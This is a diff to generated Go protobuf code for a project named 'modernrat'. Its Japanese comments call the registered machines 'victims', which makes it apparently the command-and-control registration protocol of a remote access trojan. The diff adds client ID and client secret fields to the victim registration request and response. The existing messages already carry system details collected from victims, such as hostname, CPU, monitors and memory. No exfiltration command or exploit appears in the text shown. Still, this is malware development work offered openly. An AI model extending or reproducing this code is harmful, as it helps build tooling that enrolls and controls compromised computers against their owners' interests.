@@ -340,9 +340,11 @@ func (x *SystemInfo) GetHostname() string {
 // 被害者登録リクエスト
 type RegisterUserRequest struct {
 	state         protoimpl.MessageState `protogen:"open.v1"`
-	SystemInfo    *SystemInfo            `protobuf:"bytes,1,opt,name=system_info,json=systemInfo,proto3" json:"system_info,omitempty"` // システム情報
-	UserAgent     string                 `protobuf:"bytes,2,opt,name=user_agent,json=userAgent,proto3" json:"user_agent,omitempty"`    // 被害者エージェント（オプション）
-	Timestamp     int64                  `protobuf:"varint,3,opt,name=timestamp,proto3" json:"timestamp,omitempty"`                    // タイムスタンプ
+	SystemInfo    *SystemInfo            `protobuf:"bytes,1,opt,name=system_info,json=systemInfo,proto3" json:"system_info,omitempty"`       // システム情報
+	UserAgent     string                 `protobuf:"bytes,2,opt,name=user_agent,json=userAgent,proto3" json:"user_agent,omitempty"`          // 被害者エージェント（オプション）
+	Timestamp     int64                  `protobuf:"varint,3,opt,name=timestamp,proto3" json:"timestamp,omitempty"`                          // タイムスタンプ
+	ClientId      string                 `protobuf:"bytes,4,opt,name=client_id,json=clientId,proto3" json:"client_id,omitempty"`             // クライアントが希望する固定ID（任意）
+	ClientSecret  string                 `protobuf:"bytes,5,opt,name=client_secret,json=clientSecret,proto3" json:"client_secret,omitempty"` // クライアントが保持するシークレット（任意）
 	unknownFields protoimpl.UnknownFields
 	sizeCache     protoimpl.SizeCache
 }
@@ -398,6 +400,20 @@ func (x *RegisterUserRequest) GetTimestamp() int64 {
 	return 0
 }
 
+func (x *RegisterUserRequest) GetClientId() string {
+	if x != nil {
+		return x.ClientId
+	}
+	return ""
+}
+
+func (x *RegisterUserRequest) GetClientSecret() string {
+	if x != nil {
+		return x.ClientSecret
+	}
+	return ""
+}
+
 // 被害者登録レスポンス
 type RegisterUserResponse struct {
 	state         protoimpl.MessageState `protogen:"open.v1"`
@@ -405,6 +421,7 @@ type RegisterUserResponse struct {
 	UserId        string                 `protobuf:"bytes,2,opt,name=user_id,json=userId,proto3" json:"user_id,omitempty"`                    // 生成された被害者ID
 	Message       string                 `protobuf:"bytes,3,opt,name=message,proto3" json:"message,omitempty"`                                // メッセージ
 	RegisteredAt  int64                  `protobuf:"varint,4,opt,name=registered_at,json=registeredAt,proto3" json:"registered_at,omitempty"` // 登録日時
+	ClientSecret  string                 `protobuf:"bytes,5,opt,name=client_secret,json=clientSecret,proto3" json:"client_secret,omitempty"`  // 新規登録時に払い出されるシークレット
 	unknownFields protoimpl.UnknownFields
 	sizeCache     protoimpl.SizeCache
 }
@@ -467,6 +484,13 @@ func (x *RegisterUserResponse) GetRegisteredAt() int64 {
 	return 0
 }
 
+func (x *RegisterUserResponse) GetClientSecret() string {
+	if x != nil {
+		return x.ClientSecret
+	}
+	return ""
+}
+
 var File_victim_registration_proto protoreflect.FileDescriptor
 
 const file_victim_registration_proto_rawDesc = "" +
@@ -499,18 +523,21 @@ const file_victim_registration_proto_rawDesc = "" +
 	"\bmonitors\x18\x05 \x03(\v2\x16.modernrat.MonitorInfoR\bmonitors\x12-\n" +
 	"\bcpu_info\x18\x06 \x01(\v2\x12.modernrat.CPUInfoR\acpuInfo\x12&\n" +
 	"\x0ftotal_memory_mb\x18\a \x01(\x03R\rtotalMemoryMb\x12\x1a\n" +
-	"\bhostname\x18\b \x01(\tR\bhostname\"\x8a\x01\n" +
+	"\bhostname\x18\b \x01(\tR\bhostname\"\xcc\x01\n" +
 	"\x13RegisterUserRequest\x126\n" +
 	"\vsystem_info\x18\x01 \x01(\v2\x15.modernrat.SystemInfoR\n" +
 	"systemInfo\x12\x1d\n" +
 	"\n" +
 	"user_agent\x18\x02 \x01(\tR\tuserAgent\x12\x1c\n" +
-	"\ttimestamp\x18\x03 \x01(\x03R\ttimestamp\"\x88\x01\n" +
+	"\ttimestamp\x18\x03 \x01(\x03R\ttimestamp\x12\x1b\n" +
+	"\tclient_id\x18\x04 \x01(\tR\bclientId\x12#\n" +
+	"\rclient_secret\x18\x05 \x01(\tR\fclientSecret\"\xad\x01\n" +
 	"\x14RegisterUserResponse\x12\x18\n" +
 	"\asuccess\x18\x01 \x01(\bR\asuccess\x12\x17\n" +
 	"\auser_id\x18\x02 \x01(\tR\x06userId\x12\x18\n" +
 	"\amessage\x18\x03 \x01(\tR\amessage\x12#\n" +
-	"\rregistered_at\x18\x04 \x01(\x03R\fregisteredAt2j\n" +
+	"\rregistered_at\x18\x04 \x01(\x03R\fregisteredAt\x12#\n" +
+	"\rclient_secret\x18\x05 \x01(\tR\fclientSecret2j\n" +
 	"\x17UserRegistrationService\x12O\n" +
 	"\fRegisterUser\x12\x1e.modernrat.RegisterUserRequest\x1a\x1f.modernrat.RegisterUserResponseB\x1cZ\x1agithub.com/modernrat/protob\x06proto3"
 
